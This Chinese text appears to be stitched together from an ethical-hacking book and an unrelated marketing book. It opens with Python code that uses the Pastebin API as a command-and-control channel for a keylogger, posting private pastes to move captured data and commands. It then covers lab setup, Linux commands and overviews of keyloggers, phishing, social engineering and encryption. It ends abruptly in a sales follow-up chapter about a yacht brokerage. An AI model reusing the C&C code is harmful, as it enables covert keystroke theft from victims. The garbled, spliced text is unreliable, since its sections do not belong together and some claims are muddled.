  ## 使用 Pastebin 作为命令与控制（C&C）通道\n\n我们在键盘记录器中包含了一个自杀开关（killswitch）（使用 `~` 键终止脚本），但在实际的监控程序中使用它是否是一个好主意由你决定。经验丰富的黑客会将杀死开关作为一个函数包含在键盘记录器代码中，而不是简单的按键事件，这样他们需要时甚至可以远程终止它，而不会让用户无意中杀死日志记录器。\n\
  \n我们的键盘记录器工具能够收集数据并将其发送给你，并接收要执行的命令，这是至关重要的。这被称为命令与控制（Command and Control）。你有许多可以使用的命令与控制通道，例如聊天系统、HTTP\
  \ 服务器或 Pastebin（在线的临时纯文本存储库）。为了使用我们的 Python 代码阐明命令与控制，我们将使用 Pastebin。\n\n### 使用\
  \ Pastebin 通道\n\nPastebin 提供了一个设计良好的 API，使其易于创建与他们的服务器高效通信的脚本。在我们更新键盘记录器代码之前，首先需要编写支持代码，以便方便地访问和使用\
  \ Pastebin API。我们将脚本命名为 `pastebin.py`。\n\n`pastebin.py` 将使用 `requests` 库发送 XML 格式的响应，因此，我们还需要像下面的代码中那样导入\
  \ Python 的 XML 解析器。脚本中使用的三个感兴趣的 URL 在本节中定义。\n\n```python\nimport requests\nimport\
  \ xml.etree.ElementTree as xmlparser\nlogin = \"http://pastebin.com/api/api_login.php\"\
  \npost = \"http://pastebin.com/api/api_post\"\nraw = \"http://pastebin.com/raw.php={}\"\
  \n```\n\n要使用 Pastebin 封装器，我们将使用初始化时定义的凭据实例化 `ActiveSession` 类。\n\n```python\nclass\
  \ ActiveSession():\n    def __init__(self, dev_key, user_name, password):\n    \
  \    self.dev_key = dev_key\n        self.user_name = user_name\n        self.password\
  \ = password\n        self.res = requests.post(login, data={\n            \"api_dev_key\"\
  : self.dev_key,\n            \"api_user_name\": self.user_name,\n            \"\
  api_user_password\": self.password\n        })\n        self.api_key = self.res.text\n\
  ```\n\n我们将编写代码向发送一个包含登录信息的 POST 请求。如果登录成功，API 将返回一个密钥，我们将将其存储为属性以验证后续请求。\n\n```python\n\
  def add_paste(self, title, content):\n    data = {\n        \"api_dev_key\": self.dev_key,\n\
  \        \"api_user_key\": self.api_key,\n        \"api_option\": \"paste\",\n \
  \       \"api_paste_name\": title,\n        \"api_paste_code\": content,\n     \
  \   \"api_paste_private\": 1\n    }\n    res = requests.post(post, data=data)\n\
  \    return res.text\n\ndef remove_paste(self, paste_key):\n    data = {\n     \
  \   \"api_dev_key\": self.dev_key,\n        \"api_user_key\": self.api_key,\n  \
  \      \"api_option\": \"delete\",\n        \"api_paste_key\": paste_key\n    }\n\
  \    res = requests.post(post, data=data)\n    return res.text\n```\n\n# 第 10 章\
  \ 实验室\n\n第一个任务是建立我们自己的实验室。\n\n不要在实验室以外的环境中尝试我教给你的技术：这不是成为伦理黑客正确的方法！\n\n我们如何构建一个可以进行模拟的保护环境？答案很简单：我们可以使用虚拟机管理器。\n\
  \n## 虚拟化\n\n通过使用这些程序，你可以在你的 PC 内部同时运行多个操作系统。你唯一的限制是可以使用的内存内存。\n\n\n\n\n该过程并不困难，尽管你可能需要对这个工具更加熟悉。基本上，这里是你应该采取的步骤列表：\n\
  \n* 下载一个名为 `hypervisor` 的特定软件。\n* 收集你想要安装的操作系统的 `.iso` 镜像。\n* 访问软件。\n* 启动虚拟机创建过程。\n\
  * 创建并启动此虚拟机。\n* 继续安装所需的操作系统。\n* 使用你刚刚创建的虚拟机。\n\n## Hypervisor（虚拟机监控程序）\n\n你可以从几个版本中选择。其中一些是免费的，而另一些需要订阅费用。以下是最常见的几个：\n\
  \n* `VMware Workstation`（付费版，30 天免费试用）。\n* `VMware Player`（免费版）。\n* `Oracle Virtualbox`（免费版）。\n\
  \n我们在书中使用的虚拟机监控程序是 `VMware Workstation`。它是付费版本，但我们可以利用它的 30 天免费试用。\n\n我选择使用这个虚拟机监控程序是因为在网络管理的各种功能和选项方面，它是最完整的。\n\
  \n如需下载，请访问此链接并点击“Download”：`https://my.vmware.com/en/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/15_0`。\n\
  \n如果版本 `14`——此软件的最新版本——无法运行，你可以尝试版本 `12`。某些旧 CPU 不支持。如果尚未激活，你需要从 BIOS 启用虚拟化支持（在\
  \ Google 上搜索）。\n\n此时，如果安装成功，这就是你应该能看到的内容，显然是在没有预装任何虚拟机的情况下。\n\n现在你终于准备好进行下一步。\n\n\
  ## 操作系统的镜像\n\n为了创建虚拟机，你需要你想要安装的操作系统的镜像。对于我们正在构建的实验项目，你需要以下操作系统的镜像（`.iso` 格式）：\n\n\
  * `Kali Linux` -> 可从 `https://www.kali.org/downloads/` 免费下载。\n* `Windows 7` -> 30\
  \ 天版本，在互联网上容易找到。\n* `Windows 10` -> 90 天版本，在互联网上容易找到。\n\n如果你想知道我为什么选择这些操作系统，主要原因如下：`Kali\
  \ Linux` 将成为我们的攻击机，基本上是我们用来用来启动所有攻击的机器。另外两台 Windows 机器将成为我们的目标。\n\n## 虚拟机的创建\n\n\
  现在我们只需要创建虚拟机。要做到这一点，转到“File -> New virtual machine”并按照推荐的程序进行。\n\n注意你将使用的 `RAM`\
  \ 数量。数量取决于你 PC 上的 `RAM`，你应该尝试不要过度使用。此外，目前只需继续使用网络适配器的默认选项即可。\n\n## 网络管理\n\n正确管理网络极其重要。如果你没有正确配置，虚拟机将无法相互通信，因此你的实验室无法正常工作。\n\
  \n在 `VMware` 中，我们可以使用 4 种类型的网络：\n\n如上面的截图所示，这些是可选的网络类型：\n\n* `Bridged`（桥接模式）——这种类型包括创建一个物理\
  \ PC 所在的网络的 IP 地址。我稍后解释什么是 IP 地址。\n* 现在，你只需要记住它是唯一标识网络上特定接口的数字表示。IP 地址的示例是 `192.168.1.10`。\n\
  * `NAT`——一旦进入此模式，你的虚拟机就可以连接到互联网，但从外部无法访问。\n* `Host-only`（主机模式）——在这种情况下，虚拟机只能与你的物理主机通信。\n\
  * `Custom`（自定义模式）——在这里你可以定义自己的个人网络并让所有虚拟机在内部通信。这是我们将要使用的模式！\n\n要创建它，转到“Edit -> Virtual\
  \ Network Editor”并像下方的截图所示创建一个新网络。\n\n现在你应该回到虚拟机的设置。你可以选择我们刚刚创建的网络适配器。\n\n完成此步骤后，每个虚拟机都将有自己的\
  \ IP 地址，该地址是自动分配并属于 `192.168.10.0/24` 网络。\n\n## 虚拟机的启动\n\n现在你准备好启动你的虚拟机。如果你正确执行了上述所有操作，所有机器都将启动并拥有之前分配的\
  \ IP 地址。\n\n例如，`Kali Linux` 的 IP 地址可能是 `192.168.10.1`，而 `Windows 7` 机器的 IP 地址可能为\
  \ `192.168.10.2`，带有 `Windows 10` 的机器可能是类似于 `192.168.10.3` 的值。\n\n请记住，这些虚拟机现在只能相互通信，无法连接到互联网。如果需要，我们将更改网络适配器并设置\
  \ `NAT` 模式。\n\n## 安装 VMware Tools\n\n你需要完成的另一个操作是安装 `VMware Tools`。它们仅仅是一组提高你虚拟机整体性能的特性。\n\
  \n我不会用细节来烦你。过程非常简单：你只需要在 Windows 或 Google 上搜索关键词“installation of VMware tools on\
  \ Kali”即可。\n\n## 虚拟机的连接性验证\n\n我们现在的最后努力是验证我们的虚拟机可以相互通信。你需要采取的步骤如下：\n\n1. 验证分配给每个虚拟机的\
  \ IP 地址的有效性。\n2. 在每个虚拟机上运行 PING 命令。\n\n让我们一起看看操作：\n\n* 访问 `KALI` 机器并在终端运行 `ifconfig`\
  \ 命令，验证地址可用。\n* 访问 `Windows 7/10` 机器并在命令行中输入 `ipconfig` 以验证地址的存在。\n* 记录这些 IP 地址。\n\
  * 在 `KALI` 机器上输入命令 `ping Windows 7/10`，验证响应正常且没有丢失。\n* 在 `Windows 7/10` 机器上输入命令\
  \ `ping Kali`，验证响应正常且没有数据包丢失。\n\n如果所有响应都正常，我们就可以开始下一步了。渗透测试实验室的设置阶段已经结束。\n\n# 11\
  \ 理解为什么你需要黑进自己的系统\n\n为了抓到小偷，你必须设身处处地，像他们一样思考，这就是伦理黑客的基础。你必须了解你的敌人，否则你根本无法反击。目前，一切都对安全构成威胁。系统漏洞的数量正在快速增长，黑客的数量也是如此，他们的知识也是。很快我们将面临一个没有任何系统不受影响的时代，因此学习如何保护自己的系统至关重要。\n\
  \n黑客攻击的是脆弱、薄弱且不受保护的系统。虽然你可能部署了一系列防火墙、为所有数据设置了加密并使用了 `VPNs`（虚拟专用网络），但这些仅仅创造了虚假的安全感。这些系统关注的是高级漏洞、病毒和通过防火墙的流量，而对黑客的工作方式没有任何影响。保护系统免受攻击的唯一方法是发现他们将使用的漏洞并对其进行加固。\n\
  \n\n\n\n黑客和破解者（crackers）几乎每天都在扩展他们的知识和技能，你也应该这样做。如果你想保护好你的系统，就必须学习像他们那样思考，并像他们那样工作。你是一个道德黑客；你必须知道破解者在做什么，并且必须知道如何阻止他们。你必须确切知道要寻找什么，以及如何利用你发现的东西来反击他们。\n\
  \n现在，让我明确一点——你并不需要竭尽全力保护你的系统免受每一种可能的攻击——因为你做不到。要实现这一点，你唯一的方法就是关闭电脑，拔掉电源，并将其锁在柜子里。这样一来，没有人可以触碰你的系统，甚至你也不行。但这并不是一种很好的安全处理方法，而且对任何组织都不会有好处。更重要的是，要针对已知的漏洞（更常见的已知攻击）部署安全措施。\n\
  \n要思考并预判所有可能的攻击形式，以及你系统中可能导致其处于开放状态的所有缺陷，这几乎是不可能的。世界上没有任何方法可以让你计划到所有的意外情况，特别是那些我们未知的情况。你所做的是尽力阻碍破解者。尽可能地测试各种组合，测试你的整个系统以及它的各个部分——这样你就有很大机会发现影响你整个系统的漏洞。\n\
  \n不过，不要在道德黑客方面做得过头。对于极可能永远不会发生的攻击而加强系统防御意义不大。你的真实目标应该是：\n\n*   以非破坏性的方式黑入你自己的系统\n\
  *   发现漏洞\n*   找出它们如何能被利用以及它们能产生什么影响\n*   修补漏洞并让你的系统更安全\n\n# 第 12 章 Linux 命令\n\n\
  但在之前，让我向你展示一些以后对我们很有用的基础 Linux 命令。\n\n## 基础命令\n\n这些是你在日常任务中可能用的最常用命令。\n\n- 执行命令：`ls`\n\
  解释：此命令允许你列出文件和/或文件夹的内容。\n\n- 执行命令：`pwd`\n解释：打印当前目录。\n\n- 执行命令：`cd`\n解释：它允许你访问选定的文件夹。\n\
  \n- 执行命令：`cp`\n解释：它允许你复制文件。\n\n- 执行命令：`mkdir`\n解释：它允许你创建一个文件夹。\n\n- 执行命令：`rmdir`\n\
  解释：它允许你删除文件夹。\n\n- 执行命令：`touch`\n解释：它允许你创建一个文件。\n\n- 执行命令：`tar`\n解释：它为特定文件创建一个存档。\n\
  \n- 执行命令：`clear`\n解释：它允许你返回初始 shell。\n\n- 执行命令：`adduser`\n解释：它允许你添加新用户。\n\n- 执行命令：`chmod`\n\
  解释：它管理文件和/或文件夹的权限。\n\n- 执行命令：`vi`\n解释：它允许你编辑文件。\n\n- 执行命令：`cat`\n解释：它允许对文件进行操作。\n\
  \n- 执行命令：`grep`\n解释：它在文件中搜索特定模式。\n\n- 执行命令：`apt-get`\n解释：软件包管理。例如，`apt-get install`。\n\
  \n以上是你应该尝试的所有基础命令的完整列表。你最好正确地掌握它们。\n\n## 网络命令\n\n作为道德黑客要求你对最常用的网络命令有深厚的知识。\n\n在书的其余部分，我将向你展示一些最重要的命令。尝试它们，你甚至可能创造出新的组合。\n\
  \n- 执行命令：`ifconfig`\n解释：配置网络接口的实用程序。对于查看分配给机器的 IP 地址非常有用。\n\n- 执行命令：`traceroute`\n\
  解释：此命令允许你追踪 IP 包到主机网络的路径。它对于执行此类故障排除活动非常有用，例如验证特定 IP 包在路径的哪个位置停止或丢失了。\n\n- 执行命令：`dig`\n\
  解释：这是查询 DNS 需要的实用程序。关于这个命令及其功能有很多可以说的，它的运行相当复杂。\n\n- 执行命令：`telnet`\n解释：此命令允许我们通过\
  \ `TELNET` 协议连接到远程主机。我想澄清的是，该协议允许在没有任何加密机制的情况下对数据进行可视化。出于这个原因，它不是一个非常安全的协议。\n\n\
  - 执行命令：`nslookup`\n解释：这是另一个查询 DNS 并执行反向解析的实用程序。在我们的练习中，将经常使用此命令。\n\n- 执行命令：`netstat`\n\
  解释：这是一个极其重要的命令。它允许你查看特定时间打开的网络连接。在故障排除很有很有，它允许我们验证由于网络连接未建立或丢失导致的异常。在这里，再次花些时间提高你对这个工具的了解。\n\
  \n- 执行命令：`ifup`, `ifdown`\n解释：此命令允许你启用或禁用网卡。在某些情况下非常有用，也许当需要重启网络服务时。\n\n- 执行命令：`ping`\n\
  解释：`PING` 命令用于通过向某个主机发送特殊的 ICMP 类型包并等待响应来检查该主机是否活动。让我提醒你一下，我们已经在渗透测试实验室中使用它了。\n\n\
  - 执行命令：`route`\n解释：此命令用于显示路由表，即网络数据包在网络上执行的路径。\n\n- 执行命令：`arp -a`\n解释：`arp -a` 命令提供了\
  \ MAC 地址与 IP 地址之间的链接表。例如，当我们排除涉及 ISO/OSI 模型较低层次（数据链路层）的问题时可以使用。\n\n以上是所有与网络相关的命令。当然，这个列表并没有包含全部，还有很多可以说的。但是，如果你开始熟悉这些命令，以后会表现很好。\n\
  \n## 系统管理命令\n\n现在让我们进入 Linux 命令的最后部分，它们与 Linux 机器的管理有关。\n\n- 执行命令：`uptime`\n解释：此命令显示某个系统运行了多久。\n\
  \n- 执行命令：`users`\n解释：此命令显示连接到系统的用户名。\n\n- 执行命令：`who`, `whoami`\n解释：这是另一个命令，告诉我们有多少用户连接到系统以及一些额外信息。\n\
  \n- 执行命令：`crontab -l`\n解释：此命令允许显示与当前用户相关的计划任务。我们将看到这些任务是什么。\n\n- 执行命令：`less`, `more`\n\
  解释：此命令非常有用，因为它允许你快速查看文件。按 `q` 键退出特定的显示。\n\n- 执行命令：`ssh`\n解释：此命令允许通过 `SSH` 协议连接到远程主机。后者与\
  \ `TELNET` 协议不同，它执行数据加密。出于这个原因，即使发生流量截获，无法清楚地看到任何数据。\n\n\n\n\n\n## 通用命令\n\n执行命令：`service\
  \ start / stop`\n解释：此命令允许你启动或停止特定的服务。你将在很多情况下使用它。\n\n执行命令：`free -h`\n解释：此命令显示空闲和已用内存量。例如，当机器出现性能问题时可以使用它。\n\
  \n执行命令：`top`\n解释：此命令允许你检查系统中的活动进程。如果机器在没有明显原因的情况下运行非常缓慢，这个命令会非常有用。\n\n执行命令：`ps`\n\
  解释：通过此命令，你可以查看系统中的活动和正在运行的进程。\n\n执行命令：`kill`\n解释：此命令用于终止特定进程。但是，必须先识别出与特定进程相关的 `PID`。\n\
  \n我们从通用命令开始，然后介绍了与网络相关的以及操作系统主要功能相关的命令。在此之前，让我先解释一下网络是如何工作的，以及大多数伦理黑客通常使用哪些服务。\n\
  \n# 第 13 章：学习核心黑客命令行操作\n\n了解黑客使用的技术，不仅让你理解他们如何未经许可访问你的信息，还能让你洞察这种现象是如何实现的，以及你可以采取什么措施来保护自己免受最基础的攻击。利用这些知识，如果你希望进一步开发技能并发现关于创建自己的程序和软件的额外知识，还可以进一步探索黑客技术。\n\
  \n## 键盘记录器 (Keylogger)\n\n键盘记录器是一种非常简单的软件，旨在跟踪并记录计算机用户输入的按键。这些按键和序列随后被存储在一个日志文件中，黑客可以访问该文件，从而识别出你的信息，如电子邮件\
  \ ID、密码、银行详情、信用卡号以及你通过键盘输入到机器中的几乎任何其他内容。正因如此，许多在线银行网站和其他高安全性网页使用虚拟键盘甚至图像识别口码来提供账户访问权限，因为这些无法通过键盘记录器记录。\n\
  \n键盘记录器最初是如何访问你的计算机的？这些代码或软件通常被附带在在你不知情的情况下下载到计算机的文件中，被称为`木马`（源自希腊神话中的特洛木马）。这些文件随后运行并将从你的计算机收集的信息报告给黑客。这些文件访问你计算机的其他方式还包括通过直接访问（如果有人获得了权限访问你的计算机并在其上放置文件），或者通过他们提供的、根目录下带有隐藏文件的\
  \ USB 盘。\n\n键盘记录器也可能被用于白帽目的，例如在组织内部，以确保员工遵循正确的政策和程序，而不参与欺骗行为。\n\n## 拒绝服务 (DoS/DDoS)\n\
  \n正如我们之前提到的，黑客攻击最常见的形式之一是拒绝服务。这涉及到导致网站变得不可用。由于信息和流量的泛滥导致网站宕机，系统在费力处理所有请求时会过载，并最终因无法承受而崩溃。这些攻击由黑客采用，他们的目标是出于任何原因或动机，破坏他们想要破坏的网站或服务器。例如，一个黑客主义黑客可能会关掉一个与他们的政治观点不符的网站，认为这是他们的道德义务。而黑帽黑客可能会关闭竞争对手的网站，以干扰其服务并破坏竞争对手的努力。\n\
  \n`DoS` 攻击是使用`僵尸网络`或受感染系统的网络进行的，这些系统几乎被用作一支僵尸服务器军队来反复攻击目标服务，使其过载。这些受感染系统是通过带有病毒的电子邮件和软件创建的，一旦感染，这些僵尸计算机就可以被黑客随意使用。行业数据显示，高达\
  \ 45% 的组织遭受过 `DDoS` 攻击，导致每年数百万美元的损失。\n\n## 漏洞扫描器 (Vulnerability Scanner)\n\n为了检测计算机网络中的弱点，黑客使用一种称为`漏洞扫描器`的工具。这也可以指`端口扫描器`，用于扫描特定计算机是否有黑客可以利用的可用访问点。端口扫描器还能确定在该端口上运行着哪些程序或进程，从而允许黑客获取其他有用信息。防火墙的创建是为了防止对这些端口的未经授权访问，但这更多像是一种损害减轻策略，而不是防止黑客的万无一失。\n\
  \n某些黑客能够手动识别访问点而不是使用程序。这涉及读取计算机系统的代码并测试弱点，看他们是否能够获得访问权限。如果他们无法查看代码，还可以采用程序的逆向工程方法来重建代码。\n\
  \n## 暴力破解攻击 (Brute Force Attack)\n\n如果你曾好奇过为什么在被拒绝访问之前你输入密码的机会有限，那是因为你尝试访问的服务器具有针对`暴力破解攻击`的防护。暴力破解攻击涉及软件，该软件尝试在极短时间内通过扫描字典或随机单词生成器来还原密码，以命中密码并获得访问权限。正因如此，密码已经演变成比过去长得多且复杂得多，例如包括特殊字符、数字、大写和小写字母，有些甚至禁止使用字典中找到的单词。\n\
  \n## 水池攻击 (Waterhole Attacks)\n\n水池攻击之所以得名这个名字，是因为黑客猎捕大量人员访问其计算机并交换安全信息的物理位置。类似于水池可能会被周围的野生动物投毒一样，黑客可以毒害一个物理访问点来捕获受害者。例如，黑客可能会使用咖啡馆、联合办公空间或公共\
  \ Wi-Fi 访问点等物理点。这些黑客随后能够跟踪你的活动、访问的网站以及你访问信息的时间，并策略地将你的路径重定向到一个虚假网页，允许信息发送给黑客，让他们日后可以随意使用。请确保在使用公共\
  \ Wi-Fi 时，你拥有适当的反间谍软件和防病毒软件，以便在网上可能出现可疑活动时提醒你。\n\n### 虚假 WAP (False WAP)\n\n与水池攻击类似，黑客可以使用软件创建一个虚假的无线接入点。该接入点连接到官方的公共无线接入点，但一旦受害者连接，他们就会暴露并变得脆弱，因为数据可以在任何时候被访问和窃取。在公共空间，请确保你使用的\
  \ WAP 是正确的，它们通常在访问前会有密码，或者有一个要求你输入用户名、电子邮件地址和密码的门户，这些是从管理员处获取的。如果你发现接入点完全开放，这可能是一个警示信号，因为你知道这个点可能是诱饵。\n\
  \n## 网络钓鱼 (Phishing)\n\n\n\n\n黑客用来从毫无防备的受害者处获取安全信息的另一种常用技术是钓鱼。钓鱼涉及黑客创建一个你通常认为与经常访问的网站（如银行网站或支付门户网站）相关的链接。然而，当你输入详细信息时，这些信息会被发送给黑客，而不是你认为要发送到的机构。钓鱼通常通过发送虚假电子邮件来实现，这些邮件看起来像是来自你的银行或账单机构，并通常要求你访问账户以更新详情或进行付款。\n\
  \n有几种方法可以区分你是否正成为钓鱼的目标，例如检查发者 ID（这仍然可能被伪造），或检查你提供的链接详情，看它是否与你填写详细信息的常用网站不符。你可能还会注意到邮件中的格式问题，例如\
  \ Logo 放置不当或格式糟糕，这可能表明钓鱼者没有使用正确的模板。许多机构都会坚持他们不会通过电子邮件索要你的详细信息，或要求你更新信息；如果你确实通过电子邮件收到了账单，如果你感到怀疑，可以检查之前的账单邮件，甚至给你的机构打电话以双重确认邮件是否真实。\n\
  \n## 点击劫持攻击 (Clickjacking Attacks)\n\n如果你曾尝试在信誉较差的网站上播放视频，可能会注意到界面导航可能相当混乱，因为存在虚假的播放按钮或常见区域，在你点击它们后会被重定向到其他地方。这些被称为点击劫持攻击，也称为\
  \ UI 欺装攻击 (UI Redress)。虽然重定向到广告或其他页面看起来可能无害，但如果操作得当，这些攻击可能非常阴险且具有潜在危险，因为它们能够捕获你的信息。在使用熟悉的网站时需要格外小心，因为它们可能并不像看起来那么安全，其界面会将你带到黑客想要你去的地方。始终留意你每次点击的\
  \ URL，如果它与你刚刚访问的网站有巨大差异，请确保你被带去的地方不涉及下载或交换个人信息，以保护你的安全。\n\n## 诱敌与调包 (Bait and Switch)\n\
  \n诱敌与调包技术涉及黑客提供一个看似真实的程序，但当它运行时，它实际上是一个病毒或黑客用来访问你计算机的工具。这些程序通常可以在提供盗版程序、软件、电影或高需求游戏的无良网站上找到。一旦你下载了程序，就会发现该文件并不是你预期的那样，而是向你的计算机加载了病毒，为黑客提供访问权限。\n\
  \n## 社会工程 (Social Engineering)\n\n我们之前提到过白帽黑客使用的社会工程技术。这种技术经常作为一种黑客手段被忽视，然而，它可能非常有效。社会工程的一个例子是伪装成用户或具有合法访问权限的个人，诱骗系统管理员提供详细信息。这些黑客通常被认为是骗子，而不是我们理解的黑客，但尽管如此，这仍然是一种黑客手段。许多此类黑客对他们攻击的组织的安全规范有深入了解。他们会针对并猎捕那些可能没有那么经验或安全权限低于某些高层人员的人。例如，他们可能会给帮助热台的员工打电话并请求访问系统的权限，而员工由于缺乏理解向未知来源提供信息后果的经验，就交出了信息。社会工程可以分为若干几类，如下：\n\
  \n### 恐吓 (Intimidation)\n恐吓的例子涉及上级（如经理或主管）给帮助热台技术人员打电话，愤怒并威胁如果其权威受到质疑将惩罚该技术人员。在压力下，员工将服从并提供信息。他们对权威的质疑会被立即终止，因为员工重视自己的工作，并主动协助黑客获取信息。\n\
  \n### 乐助 (Helpfulness)\n在光谱的另一端是乐助技术。这涉及假装痛苦和担忧，以利用技术人员提供帮助和同情的本性。与其表现出愤怒并给技术人员施加压力，处于痛苦中的黑客会表现得自己也处于压力之下，并对结果感到担忧。技术人员将尽可能提供援助，而不考虑可能给黑客带来进一步痛苦的后果。\n\
  \n### 搬出名号 (Name-dropping)\n拥有授权用户的名字为黑客提供了优势，他们可以假装成某个特定人物，该人物理应有权访问这些信息。这可以通过在网上\
  \ easily 找到的公司网页来实现。另一个例子是搜索被不当丢弃的文档，为黑客提供关键细节。\n\n### 技术 (Technical)\n社会工程黑客的另一个领域是利用技术作为支持手段来获取信息。这可能涉及黑客向合法用户发送传真或电子邮件，要求用户回复敏感信息。黑客通常伪装成执法部门或法律代表，要求将信息作为其正在调查的文件的一部分。\n\
  \n## 根内核工具 (Rootkit)\n\n根内核工具通过合法进程进入你的操作系统，使用低级且难以检测的程序。根内核工具可以从用户手中接管操作系统的控制权，由于程序本身作为代码替换隐藏在系统二进制文件中，用户想要手动检测并移除该程序是极其困难且几乎是不可能的。\n\
  \n## 数据包分析器 (Packet Analyser)\n\n在跨互联网或任何其他网络传输数据时，黑客可以使用称为数据包分析器或数据包嗅探器的应用程序来捕获数据包，这些包可能包含密码和其他记录等关键信息。\n\
  \n# 第 14 章 什么是加密和数字签名\n\n加密是利用微缩点、图片组合或其他方式隐藏数据的策略。在专业领域，它倾向于被称为将明文混乱成编码结构，大部分称为\
  \ `Ciphertext`（密文），当然将其转换为未混乱的配置即 `Cleartext`（明文）。这种编码和解密的过程被称为加密，从事该领域的人被称为密码学家。\n\
  \n\n\n\n\n## 加密概述\n\n1.  **对称加密**——也称为密钥加密，这是一种发送者和接收者共享相似秘密代码和密钥进行加密和解密的策略。这种策略在您与预定的少数人员交谈时很有帮助，但在任何情况下，它对于大规模通信并没有太大价值。\n\
  \n2.  **非对称加密**——也被称为公开密钥加密，加密和解密使用不同的密钥。这对于密钥交换和数字签名非常有价值，例如 `RSA`、高级数字签名算法、公开密钥加密标准等。\n\
  \n3.  **消息摘要**——在这种模式中，利用哈希算法对所有信息进行永久混乱。这也被称为单向加密。\n\n加密确保了系统资产免受篡改、破坏和未经授权使用的的影响。它们保护了系统架构、IT\
  \ 资源和机密信息。在如今，修改或控制信息数据已变得非常简单。隐私数据的泄露再次是一个令人不安的现象。\n\n加密系统自苏美尔人时代（公元前 3500 年）起一直被使用。加密依赖于密钥，正如你将看到的，密钥是提供数字内容的计算因素。加密有两种基本类型：传统加密和公开密钥加密。在传统加密中，使用单一密钥执行加密和解密。由于密钥是不可分的，因此被称为对称密钥。由于传统加密只使用一个密钥，所以它的安全性较低。如果预期受益者以外的任何人发现了密钥，他就可以破解第一条消息。普通加密的另一个缺点是分发很危险。如果有人在通往预期受益者的途中拦截了密钥，消息的安全性就会受到破坏。`PGP\
  \ Desktop` 还允许你对个人记录和组织文件、分配为虚拟磁盘的硬盘部分或你的整个硬盘进行编码。\n\n在公开密钥加密中，使用两个特定的密钥：一个公开密钥用于加密，一个私钥用于解密。由于密钥是唯一的，因此被称为非对称密钥。这允许任何人加密消息，但只有拥有相应私钥的人才能解码消息。为了解释这一点，我们来看一个模型。如果\
  \ Paul 需要给 Sara 留下深刻印象，他使用 Sara 的公开密钥来加密消息。当 Sara 收到消息时，她使用自己的私钥进行解密。只要消息圈中的每个人都保持私钥完全私密，只有预期的受益者就能破解消息。公开加密还解决了分发问题，因为只有公开密钥需要在不安全的系统中传输；私钥则保留在本地。\n\
  \n# 第 15 章跟进\n\n与你的潜在客户保持对话并礼貌地跟进，以确保没有业务机会流失。\n\n“但这难道会牺牲我们标志性的个性化销售体验吗？”我们的一位客户（一家著名的游艇经纪公司）怀疑地询问道。这位客户在过去的十年里一直避开数字营销，其借口是他们不想把那些反复无常的高净值客户当成“数字”。\n\
  \n我们客户的营销方法包括举办奢华的游艇聚会和独家晚宴。与会者是处于“黄金年”的富裕退休男性，他们看重高触达、低压力的销售体验。游艇社交的追求过程通常会持续几年，潜在客户才会感到可以自在地开出一张数百万美元的支票。\n\
  \n当销售额停滞几年后，该客户将其归咎于经济。但当经济复苏而销售额开始下滑时，他们变得紧张起来，知道必须做些什么来扭转这一趋势。\n\n这家游艇经纪公司正支付着昂贵的鱼子酱和水晶槟账单，但莫名其妙地陷入了记忆以来最长的销售枯干期。为了扭转局面，他们计划了一场世纪晚宴，比以往任何时候都规模更大、更贵。然而，由于几个月没有卖出一艘巨型游艇，他们的资金库几乎枯竭，他们担心可能不得不取消活动。\n\
  \n在听到一位潜在游艇买家吹嘘他的儿子参加了《创业鲨谭》（Shark Tank）节目，以及增长黑客技术如何彻底了他的业务后，游艇经纪公司的老板立即联系了我们。老板提出了两个明确的要求：“无论你们做什么，必须感觉是个性化的……而且绝对必须在晚宴前的八周内促成游艇的销售。”\n\
  \n这不是一项艰小的任务。你如何仅用数字营销技术，让成千上万挑剔的潜在客户感到自己的购物体验是完全为他们量身定制的？\n\n对于这个挑战，成功取决于我们设计一个数字跟进流程的能力。这个价值百万的问题是：它是否能产生足够快的销售来挽救晚宴并最终拯救公司？\n\
  \n## 攻克跟进流程\n\n即使是最具吸引力和教育意义的在线销售体验，平均每百个潜在客户中九七个不会立即采取购买行动。然而，这九七个潜在客户来到你这里是有原因的，你的职责和义务一直留在他们面前，直到他们准备好购买。\n\
  \n线下跟进的挑战在于，事情不可避免地会流失。当你将一个人类引入流程中时，你就创造了更多犯错的机会。无论是组织不当还是跟踪不力、时间与精力的限制、优先顺序的转变，还是简单的记忆失效，都有许多因素可以并且确实会偏离模拟世界的跟进流程。\n\
  \n数字化的跟进流程可以避免模拟世界的陷阱和危险。你手头有很多工具可以帮助对你的跟进流程进行排序、组织和自动化。例如，你可以使用自动回复器发送一系列以潜在客户首名称呼的邮件，并根据潜在客户是否打开了先前的邮件或点击了链接来更改消息的顺序和时机。你所想到的每种其他通信媒介（从短信、电话到社交媒体消息等）都可以应用相同的自动回复原理。\n\
  \n将跟进流程数字化的益处是，它可以自动运行而无需你费心；你可以“设置后即可忽略”。事实上，某些策略允许你在潜在客户没有提供任何联系信息的情况下进行跟进。\n\n\
  ## 广告 7 法则\n\n建立跟进环节价值背后的基本原理是重复。我们经常被问的问题是：“我应该跟进多少？”虽然答案取决于价格点、销售周期长度、行业竞争情况、品牌以及其他几个因素，但我们引用的经验法是“广告\
  \ 7 法则”。广告 7 法则指出，一个人大约需要七次触点才能记住你的品牌。\n\n广告 7 法则的依据是认知心理学家乔治·米勒（George Miller）于\
  \ 1956 年在普林斯大学进行的一项研究。米勒法则指出，平均人在工作记忆中可以保持的对象数量是 7 ± 2。幸运的是，美国本地电话号码的位数是 7 位（直到手机广泛普及后才通常需要区号）。\n\
  \n\n\n\n无论来源如何，“广告七次法则”的核心要点是：只有重复才能被记住。没有人比第二次世界大战期间的宣传人员更深刻地内化并执行了这一概念。他们通过接管媒体机构，重复他们的教条，直到这些教条渗透并陶醉了整个国家的信仰体系。虽然宣传产物可能不尽如人意，但人们无法否认重复的影响力。\n\
  \n幸运的是，数字世界中的重复并不需要接管媒体机构，结果同样强大。\n\n## 将其映射到你的销售周期\n\n虽然“广告七次法则”提供了一个数量上的概念，但我们经常被问到的下一个问题是跟进频率。我们建议的框架是将你的\
  \ `Follow-Up`（跟进）映射到你的平均销售周期长度。通常，产品或服务的价值越高，销售周期就越长，对于面向消费者（B2C）销售尤其如此。例如，如果你观察到某人购买你的服务平均需要四周，那么就围绕四周的时间段来建立你的\
  \ `Follow-Up`。我们还建议将跟进频率集中在时期初期，以利用被称为“首因效应”（primacy effect）的心理学：首次触点往往比中间触点更容易被记住，且潜在客户对沟通更加开放。当你构建一个覆盖整个平均销售周期的跟进序列时，你也将受益于“近因效应”（recency\
